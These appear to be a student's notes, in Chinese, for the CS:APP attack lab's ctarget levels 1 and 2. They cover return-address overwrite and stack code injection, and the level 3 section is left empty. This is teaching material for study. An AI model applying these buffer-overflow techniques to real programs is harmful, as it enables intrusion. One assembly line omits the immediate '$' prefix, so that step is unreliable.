

ctarget level1:
前面40个字节正常的输入，最后8个字节是 touch1的地址004017c0。
但因为小端的问题，所以要反过来写：c0 17 40 00

./hex2raw < cl1hex.txt > cl1raw.txt
./ctarget -q < cl1raw.txt


ctarget level2:

add dif,%rsp #dif还要算, 让rsp指向 touch2的位置
mov 0x59b997fa, %rdi
retq
touch2的地址。
补全40个字节。
返回到 injection code 第一条指令的位置

把栈给画出来即可

1. 把需要用到的命令放在cl2Draft.s中，使用gcc命令编译成目标代码：
gcc -c cl2Draft.s
得到一个目标代码： cl2Draft.o

2. 反汇编 成汇编代码：
objdump -d cl2Draft.o > cl2Binary.s
得到文件 cl2Binary.s

3. 查看cl2Binary.s中的二进制代码
修改并 加入 地址那些内容，写入文件 cl2hex.txt中

4. 把 cl2hex.txt 转换成 cl2raw.txt：
./hex2raw < cl2hex.txt > cl2raw.txt

5. 运行程序：
./ctarget -q < cl2raw.txt


ctarget level3:





